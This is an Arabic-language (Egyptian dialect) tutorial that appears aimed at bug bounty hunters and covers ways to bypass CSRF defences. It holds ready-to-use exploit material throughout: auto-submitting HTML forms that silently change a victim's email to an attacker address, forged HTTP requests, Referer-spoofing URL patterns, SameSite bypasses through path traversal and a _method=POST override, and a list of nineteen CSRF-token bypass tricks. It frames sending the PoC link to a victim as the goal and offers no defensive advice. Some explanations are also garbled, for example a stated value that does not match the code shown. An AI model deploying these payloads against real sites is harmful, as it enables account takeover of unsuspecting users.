# *ุงูุชุญุงูู ุงููุชูุฏู ุนูู CSRF*

๐น ููุง ุชุญุงูู *ุชุญุฏูุซ ุญุงุฌุฉ ูู ุงููููุนุ* ูููู ุชุณุชุบู ุฏู ูุนูู *ูุฌูู CSRF* ุจุงุณุชุฎุฏุงู Burp Suite:
1. ุงูุชุญ *Burp Suite* โ *Engagement Tools* โ *Create CSRF PoC*.
2. ุฎุฏ ุงููููู ุงููุงุชุฌ ูุงุจุนุชู ููุถุญูุฉ.

๐น *ููุง ุงูุถุญูุฉ ูุถุบุท ุนูู ุงูููููุ ุงูุชุญุฏูุซ ุงููู ุงูุช ุนููุชู ุจูุชููุฐ ุนููู ุจุดูู ุชููุงุฆู.*

๐น *ููู ุงููุดููุฉ:* ูู ููููุง ุฅู ุงููููุน ุนูุฏู *ุญูุงูุฉ ุนุจุฑ CSRF Token* ุจุชุญุงูู ุชููุน ุงููุฌูู.

๐น *ุงูุญู:* ูุงุฒู ููุงูู *ุทุฑููุฉ ููุชุญุงูู ุนูู CSRF Token ุจุฃู ูุณููุฉ!* 

---


## *๐น ุงูุญูุงุฌุฒ ุงููู ูููู ุชููุนู ูู ุงุฎุชุจุงุฑ ุซุบุฑุงุช CSRF:*

1๏ธโฃ *ุงูู Referrer* โ ุจุนุถ ุงูููุงูุน ุจุชุชุญูู ูู ูุตุฏุฑ ุงูุทูุจ ูููุน ุงููุฌูุงุช ุงูุฎุงุฑุฌูุฉ.

2๏ธโฃ *CSRF Token* โ ููุงูุน ุจุชุณุชุฎุฏู ุชูููุงุช ุฏููุงููููุฉ ููู ุทูุจ ุนุดุงู ุชุชุญูู ููู.

3๏ธโฃ *SameSite Cookies* โ ุงูููููุฒ ุงููู ุจูุชู ุชูููุฏูุง ุจุญูุซ ูุชุชุจุนุซุด ูุน ุงูุทูุจุงุช ุงูุฎุงุฑุฌูุฉ.

4๏ธโฃ *JSON Format* โ ุจุนุถ ุงูุชุทุจููุงุช ุจุชุทูุจ ุจูุงูุงุช ุจุตูุบุฉ JSONุ ูุฏู ุจูุตุนุจ ุชูููุฐ CSRF ุจุงูุทุฑููุฉ ุงูุชูููุฏูุฉ.

---
## *๐น ุงูุชุญุงูู ุนูู Referrer ูู CSRF Bypass*

โ **ูู ุงููููุน ุจูุชุญูู ูู Referrer ูููุณุ ููู ุทุฑููุชูู ูููู ุชุณุชุฎุฏููู:**
1. **ุฅุฒุงูุฉ Referrer Header ูู ุงูุทูุจ.**
2. **ุชุนุฏูู Referrer ููููู ุจุงูุดูู:**
   ```
   https://attacker.com/https://victim.com
   ```

๐น *ููู ุงูุณุคุงู ููุง:* ุฅุฒุงู ูููู ุชุญุท Referrer ุงููุทููุจ ุฌูุง HTML PoCุ ๐ค
---
```
<html>
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form name="hacker" method="POST" action="https://account.example.com/change_email">
    <input type="hidden" name="email" value="hossamshady24@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>
</body>
</html>
```

---

## *ุทุฑู ุงูุชุญุงูู ุนูู Referrer*

ูููู ุชูุฏุฑ ุชุชุฌุงูุฒ ูุญุต Referrer ุจุงุณุชุฎุฏุงู ูุงุญุฏุฉ ูู ุงูุทุฑู ุฏู:

- evil.com/account.example.com
- account.exampleevil.com
- evil.com#account.example.com
- evil.com/file@example.com   ---> *ุฏู ุงูุฃูุชุฑ ุงุณุชุฎุฏุงููุง*

---
---

## *๐น ุงูุชุญุงูู ุนูู JSON Format ูู CSRF*

๐น *ูู ูุงุฒู ุชุถูู ุจูุงูุงุช ุจุตูุบุฉ JSON ุฌูุง PoCุ ููู ุทุฑููุฉ ุชูุฏุฑ ุชุณุชุฎุฏููุง:*

โ **ุจุฏู ูุง ุชุจุนุช Content-Type: application/jsonุ ุงุณุชุฎุฏู Content-Type: text/plain!**

๐น *ููุฏ ุงุณุชุบูุงู PoC:*
```
html
<form name="hacker" method="POST" action="https://example.com/phone.json" enctype="text/plain">
    <input type="hidden" name='{"new_email":"attacker@example.com"}'>
</form>
<script>
    document.forms[0].submit();
</script>
```

๐น *ุงููุฑู ูู ุงูุทูุจุงุช:*

- *ุงูุทูุจ ุงูุนุงุฏู:*
  
```
  POST /api/profile/update HTTP/2
  Host: app.example.com
  Content-Type: application/json
  {
      "new_email": "user@example.com"
  }
  ```
- **ุงููุฌูู ุจุงุณุชุฎุฏุงู text/plain:**
  
```
  POST /api/profile/update HTTP/2
  Host: app.example.com
  Content-Type: text/plain
  {"new_email":"attacker@example.com"}
  ```

โ *ูุฏู ุงูุณูุฑูุฑ ูููุฑุง ุงูุจูุงูุงุช ุนุงุฏู ูCSRF ููุดุชุบู!* ๐๐ฅ
---
๏ฟฝ **ููุง ุชุจุนุช ุทูุจ ุจู Referrer ุบูุฑ ูุชูุงูู ูุน ุงููููุนุ ูููู ูุฑุฏ ุนููู ุจู 400 Bad Request!** ๐ต

๐น **ูุซุงู ูุทูุจ ูุดู ุจุณุจุจ Referrer ูุด ููุจูู:**
```
http
POST /api/profile/update HTTP/2
Host: app.example.com
Content-Type: application/x-www-form-urlencoded
Referer: https://attacker.com/poc

new_email=attacker%40example.com
```
๐น **ุงูุณูุฑูุฑ ููุฑุฏ ุจู HTTP/2 400 Bad Request ูุจุงูุชุงูู ุงููุฌูู ูููุดู.** โ

---

## *๐น ุงูุชุญุงูู ุนูู Referrer ุนุดุงู ููุฌุญ ุงููุฌูู*

๐น **ูู ุงูุณูุฑูุฑ ุจูุชุญูู ูู ุงูู Referrer ุจุทุฑููุฉ ุถุนููุฉุ ูููู ุชุณุชุฎุฏู ุญููุฉ ุนุดุงู ุชุฎููู ููุจูู.** ๐

โ **ุชุนุฏูู Referrer ุนุดุงู ูุญุชูู ุนูู ุฑุงุจุท ุงูุถุญูุฉ ุฏุงุฎู ุฑุงุจุท ุงููุฌูู ููุณู!**

๐น *ูุซุงู ูุทูุจ ูุนุฏู ูุฌุญ ูู ุชุฌุงูุฒ ุงููุญุต:*
```
http
POST /api/profile/update HTTP/2
Host: app.example.com
Content-Type: application/x-www-form-urlencoded
Referer: https://attacker.com/poc?app.example.com

new_email=attacker%40example.com
```

๐น **ุงูุณูุฑูุฑ ููุฑุฏ ุจู HTTP/2 200 OK ููุฏู ุงููุฌูู ูุฌุญ!** โ๐ฅ

---
## *๐น ุชุฌุงูุฒ ุญูุงูุฉ SameSite Strict Cookie*

๐น *ุญูุงูุฉ SameSite=Strict ุจุชููุน ุฅุฑุณุงู ุงูููููุฒ ูุน ุงูุทูุจุงุช ุงููุงุฏูุฉ ูู ููุงูุน ุฎุงุฑุฌูุฉ.*
๐น *ุงูุญูุ* ูุงุฒู ุชูุงูู *ุซุบุฑุฉ ุฅุนุงุฏุฉ ุชูุฌูู (Open Redirect) ุฃู Path Traversal ุฏุงุฎู ููุณ ุงููููุน.*

โ *ูุซุงู ูู ุนูุฏู ุฑุงุจุท ุชุบููุฑ ุงูุจุฑูุฏ ุงูุฅููุชุฑููู:*

```
https://example.com/change_email
```
๐น *ูุงููููุน ุจูููุนู ูู ุชุบููุฑู ุจุณุจุจ ุณูุงุณุฉ SameSite* โ

โ *ุงูุญู: ุฏูุฑ ุนูู ุตูุญุงุช ุฏุงุฎู ุงููููุน ูููุง Path Traversal ุฃู Open Redirect.*

๐น *ูุซุงู ูููุฏ ุฌุงูุงุณูุฑูุจุช ูููู ูุณุงุนุฏู ูู ูุดู Path Traversal:*
```
javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
๐น **ูู ุงูุชุทุจูู ุนูุฏู ุถุนู ูู ุงูุชุนุงูู ูุน ุงููุชุบูุฑุงุช ูู ุงูุฑุงุจุท (postId)ุ ูููู ุชุณุชุฎุฏูู ูู ุงููุฌูู.**

โ *ูุซุงู ูุงุณุชุบูุงู Path Traversal ูู CSRF:*
```
https://example.com?postID=hossam/../../../../change_email
```

๐น **ุจูุฌุฑุฏ ูุง ุงููููุน ูุนุงูุฌ postID ุจุฏูู ูุญุตุ ููุชู ุชูุฌูู ุงูุทูุจ ุฅูู /change_email ุฏุงุฎู ููุณ ุงููููุน.**
โ *ูุฏู ุงููุฌูู ููุดุชุบู ุฑุบู ุงูุญูุงูุฉ!* ๐ฅ๐

---
## **ุชุฌุงูุฒ ุญูุงูุฉ SameSite Lax ุจุงููุตุฑู**

๐น **ุญูุงูุฉ SameSite Lax** ุจุชููุน ุฅุฑุณุงู ุงูููููุฒ ูุน ุงูุทูุจุงุช ุงููู ุฌุงูุฉ ูู ููุงูุน ุฎุงุฑุฌูุฉุ ููููุง ูููู ุชุชุฌุงูุฒ ูู ุญุงูุชูู ุจุณ:

1๏ธโฃ **ูู ุงูุทูุจ ูู ููุน GET.**

2๏ธโฃ **ูู ุงููุณุชุฎุฏู ุถุบุท ุจููุณู ุนูู ุงููููู ุงููู ุจูุนูู ุงูุทูุจ.**

โ **ูุซุงู ุนูู ุงุณุชุบูุงู ุงูุญูุงูุฉ ุฏู:**
```http
GET /my-account/change-email?email=asd%40asd.asd HTTP/1.1
Host: example.com
Cookie: session=ualJ1PbUNh0Uhq3MEt4cTP7sZZ1svF4w
```
๐น **ููู ุงููุดููุฉ:** ุจุนุถ ุงูุณูุฑูุฑุงุช ุจุชููุน ุงุณุชุฎุฏุงู `GET` ูุน ุนูููุงุช ุญุณุงุณุฉ ูุจุชุฑุฏ ุจู `405 Method Not Allowed`. โ

---

## **๐น ุงูุญู: ุชุญููู ุงูุทูุจ ุฅูู POST ุจุฃู ุทุฑููุฉ!**

๐น **ูู ุงูุณูุฑูุฑ ูุด ุจููุจู `GET`ุ ูููู ูุญุงูู ูุฎููู ููุจู `POST` ุนู ุทุฑูู ุชุนุฏูู ุงูุทูุจ ุจุฅุถุงูุฉ `method=POST` ูู ุงูู POC.**

โ **ูุซุงู ุนูู ุงุณุชุบูุงู ุจุณูุท ุจุงูููุฏ:**
```html
<script>
    document.location = "https://example.com/my-account/change-email?email=hacker@example.com&_method=POST";
</script>
```
๐น **ูุฏู ุงูุณูุฑูุฑ ูููู ูุนุงูุฌ ุงูุทูุจ ูุฃูู `POST`ุ ูููุจู ุชูููุฐ ุงููุฌูู!** ๐๐ฅ

โ **ุงูููุทุฉ ุงููููุฉ:** ูุงุฒู ุงูุณูุฑูุฑ ูููู ุนูุฏู ุถุนู ูู ูุนุงูุฌุฉ ุงูุทุฑู (`HTTP Methods`) ุนุดุงู ุงูุทุฑููุฉ ุฏู ุชุดุชุบู.

๐น **ุจูุฏู ููุฏุฑ ูุชุฌุงูุฒ SameSite Lax ุฑุบู ุงููููุฏ ุงูุฃูููุฉ ุงูููุฌูุฏุฉ.** ๐ฅ

---

## **ุชุฌุงูุฒ JSON Parameters ู Referrer Header ุจุงููุตุฑู**

๐น **ููุง ุจุชุจุนุช ุจูุงูุงุช JSONุ ุฃุญูุงููุง ุจูููู ูู ูุดููุฉ ูุน ุงูููู ุงููุงุฑุบุฉ ุฃู ุงูุบูุฑ ููุจููุฉ ูู ุงูุทูุจ.**

โ **ูุซุงู ุนูู ุงูู JSON ุงูุนุงุฏู ุงููู ูููู ูุญุชุงุฌ ูุนุฏูู ููู:**
```json
{"username":"shadyhacker"}
```
๐น **ููู ูู ุญุจููุง ูุญุฐู `=` ูู ุงูููุงูุฉุ ูููู ูุณุชุฎุฏู ุชุฑูู ุจุณูุท!**

โ **ุฅุถุงูุฉ ุจุงุฑุงูุชุฑ ุฌุฏูุฏ ุจุงุณู `a` ูุชุญุท ุงููููุฉ `}` ุฌูุงูุ ูุงููุงุชุฌ ูููู:**
```json
{"username":"shadyhacker", "a":"="}
```
๐น **ุงูุณูุฑูุฑ ููุชุนุงูู ูุน ุงูุทูุจ ุจุงูุดูู ุฏู ุจุฏูู ูุดุงููุ ูุงุญุชูุงู ูุญุตู ุชุฌุงูุฒ ููุญูุงูุฉ!** ๐ฅ

---

## **๐น ุญุฐู Referrer Header ุนุดุงู ุงููุฌูู ูุดุชุบู**

๐น ุจุนุถ ุงููุทูุฑูู ุจูุธููุง ุฅู ุฃู ุทูุจ ูุงุฒู ูููู ููู `Referrer Header`ุ ูุฏู ูููู ูููุน ุชูููุฐ ุจุนุถ ุงููุฌูุงุช.
๐น **ููู ูููู ูุฎุฏุน ุงููุธุงู ููููุน ุฅุฑุณุงู ุงูููุฏุฑ ุฏู ุจุงุณุชุฎุฏุงู `meta no-referrer`.**

โ **ูุซุงู ุจุณูุท ูุฅูุบุงุก ุงูู Referrer:**
```html
<meta name="referrer" content="no-referrer">
```
๐น **ูุฏู ุงููุชุตูุญ ูุด ููุจุนุช `Referrer Header`ุ ูุงููุฌูู ูููู ูุชู ุจุฏูู ูุดุงูู!** ๐

---

## **๐น ุงุณุชุบูุงู CSRF Bypass ุจุงุณุชุฎุฏุงู No-Referrer**

โ **ููุฏ HTML ุจุณูุท ูููุฐ ูุฌูู CSRF ุจุฏูู Referrer:**
```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <!-- ููุน ุฅุฑุณุงู Referrer Header -->
    <meta name="referrer" content="no-referrer">
</head>
<body>
    <form action="https://app.example.com/api/profile/update" method="POST">
        <input type="hidden" name="new_email" value="attacker@example.com">
        <input type="submit" value="Submit request">
    </form>
    <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
    </script>
</body>
</html>
```
๐น **ุจูุฏูุ ุงูุทูุจ ููุชุจุนุช ุจุฏูู Referrerุ ููู ุงููููุน ุจูุนุชูุฏ ุนููู ูุญูุงูุฉุ ูุงููุฌูู ูููุฌุญ!** ๐๐ฅ

---
## **ุชุฌุงูุฒ CSRF Token ู Referrer ุจุงููุตุฑู**

๐น **ุงูุชุญุงูู ุนูู Referrer ุจุงุณุชุฎุฏุงู Unsafe-URL**

โ **ุงุณุชุฎุฏุงู `<meta name="referrer" content="unsafe-url">` ุจูุฎูู ุงููุชุตูุญ ูุจุนุช ุงูู Referrer ุญุชู ูู ูุงู ุงูุฑุงุจุท ุบูุฑ ุขูู.**
```html
<meta name="referrer" content="unsafe-url" />
```
๐น **ุฏู ูููู ูุณุฑูุจ ุจูุงูุงุช ุญุณุงุณุฉ ูู ุงูู URL ููุทูุจุงุช ุบูุฑ ุงูุขููุฉ (HTTP).**

---

## **๐น ุทุฑู ุชุฌุงูุฒ CSRF Token**

โ **1. ุญุฐู ุงูุชููู ุจุงููุงูู ุฃู ุฅุฒุงูุฉ ูููุชู.**

โ **2. ุงุณุชุฎุฏุงู ุชููู ุจููุณ ุงูุทูู ูููู ุนุดูุงุฆู.**

โ **3. ุชุฌุฑุจุฉ ุชุบููุฑ ุทูู ุงูุชููู (ูุงูุต 1 ุฃู ุฒุงุฆุฏ 1).**

โ **4. ุฅุฏุฎุงู ุชููู ุงูููุงุฌู ุจุฏู ุงูุถุญูุฉ.**

โ **5. ุชุญููู ุงูุทูุจ ูู `POST` ุฅูู `GET` ูุฅุฒุงูุฉ ุงูุชููู.**

โ **6. ูู ุงูุทูุจ `PUT` ุฃู `DELETE`ุ ุฌุฑุจ `POST`.**

โ **7. ูู ุงูุชููู ูู `Custom Header`ุ ุฌุฑุจ ุฅุฒุงูุชู.**

---

## **๐น ุชุฌุงูุฒ ุญูุงูุฉ Content-Type**

โ **8. ุชุบููุฑ ุงูู Content-Type ุฅูู: `application/json`, `application/x-www-form-urlencoded`, `form-data`, `text/plain`, `application/xml`.**

โ **9. ูู ููู Double Submit Token ูู ุงูููููุฒ ูุงูููุฏุฑุ ุฌุฑุจ ุชูููุฐ CRLF Injection.**

โ **10. ุชุฌุงูุฒ ูุญุต ุงูู Referrer ุจุงุณุชุฎุฏุงู:**

```html
<meta name="referrer" content="never">
```

---

## **๐น ุทุฑู ุฃุฎุฑู ููุชุญุงูู ุนูู CSRF Token**

โ **11. ุณุฑูุฉ ุงูู CSRF Token ุจุงุณุชุฎุฏุงู XSS ุฃู CORS.**

โ **12. ุชุบููุฑ ุงูู Content-Type ูุชุฌุฑุจุฉ Flash + 307 Redirect.**

โ **13. ุชุฌุฑุจุฉ ุชุฎููู ุงูุชููู ูู ููู ุฌุฒุก ุซุงุจุช.**

โ **14. ุงุณุชุฎุฏุงู Clickjacking ูุชูููุฐ ุงููุฌูู ุฑุบู ุงูุญูุงูุฉ.**

โ **15. ุงุณุชุบูุงู Type Juggling ูู ุงูุชุทุจูู ุจูุณุชุฎุฏู PHP ูููุจู ุงูููู ุจุดูู ุบูุฑ ุตุญูุญ.**

โ **16. ุชุฌุฑุจุฉ ุฅุฑุณุงู ุงูุชููู ูู Array ุฒู ูุฏู:**
```http
newemail=victim@gmail.com&csrftoken[]=lol
```
โ **17. ุชุนููู ุงูุชููู ููููุฉ `null` ุฃู ุฅุถุงูุฉ Null Bytes.**

โ **18. ุงูุชุฃูุฏ ูู ุฅู ุงูุชููู ูุด ุจูุชุณุฑุจ ุนุจุฑ HTTP ููุตุงุฏุฑ ุฎุงุฑุฌูุฉ.**

โ **19. ุชูููุฏ ุฃูุชุฑ ูู CSRF Token ููุฑุงูุจุฉ ุงูุฌุฒุก ุงูุซุงุจุช ูููุ ุซู ุงููุนุจ ูู ุงูุฌุฒุก ุงููุชุบูุฑ.**

๐น **ุจูุฏู ุนูุฏู ุฃูุชุฑ ูู ุทุฑููุฉ ุนุดุงู ุชุชุฌุงูุฒ CSRF Token ูู ููุงูุน ูุฎุชููุฉ.** ๐๐ฅ

